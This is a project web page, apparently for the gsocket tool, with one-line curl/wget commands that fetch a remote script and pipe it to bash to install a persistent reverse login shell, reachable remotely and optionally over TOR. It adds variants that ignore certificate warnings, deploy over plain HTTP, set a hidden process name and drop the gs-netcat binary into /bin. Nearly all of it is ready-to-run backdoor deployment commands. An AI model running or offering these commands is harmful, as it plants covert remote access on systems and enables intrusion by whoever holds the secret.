---
layout: default
---

<p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>



> _This must be the quickest way to access a system_
>                                                 -- anonymous

Use either one of these two commands to _install_:
```shell
bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
bash -c "$(wget -qO- gsocket.io/x)"
```

Use either one of these two commands to _uninstall_:
```shell
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"
```

Use either command to _access_ the remote host:
```shell
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
S="ExampleSecretChangeMe" bash -c "$(wget -qO- gsocket.io/x)"
```

<p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>

{:refdef: style="text-align: center;"}
## Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from your workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}

{:refdef: style="text-align: center;"}
## Tips & Tricks
{: refdef}

Ignore SSL / Certificate warnings:
```shell
bash -c "$(curl -fsSLk gsocket.io/x)"
```
```shell
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
```

Deploy with a predefined secret:
```shell
X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
```

Deploy with *curl* and fallback to *wget*:
```shell
command -v curl >/dev/null && bash -c "$(curl -fsSL gsocket.io/x)" || bash -c "$(wget -qO- gsocket.io/x)"
```

Deploy with a predefined secret. Try *curl* and fallback to *wget*:
```shell
X=ExampleSecretChangeMe && (command -v curl >/dev/null && X=$X bash -c "$(curl -fsSL gsocket.io/x)" || X=$X bash -c "$(wget -qO- gsocket.io/x)")
```
  
Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages and using good old plain HTTP:
```
wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
```

Useful environment variables:  

|:---|:---|
|S=|Connect to a system (or use `gs-netcat -s <secret> -il`).|
|X=|Set a predefined secret for the installation (X like in inXstallation).|
|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk gsocket.io/x)`.|
|GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically.|
|GS_URL_BASE=|Use URL for static binaries. The default is https://github.com/hackerschoice/binary/raw/main/gsocket/bin/.|
|GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL gsocket.io/x)"`.|
|GS_HIDDEN_NAME=|Use a custom hidden process name.|
|TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|

If all fails:

Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:
```shell
curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
```

If the shell looks fucked up:

This can happen if the remote site does not support Pseudo Terminals (such as when in a chroot()/jail). In this case connect using ```gs-netcat -s <SECRET>``` (without the _-i_ flag). Once connected force the terminal into raw mode:
```shell
# Press Ctrl-Z on your workstation to suspend gs-netcat
# and return to your own terminal. In your terminal type:
stty raw -echo opost; fg
```	

<p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>



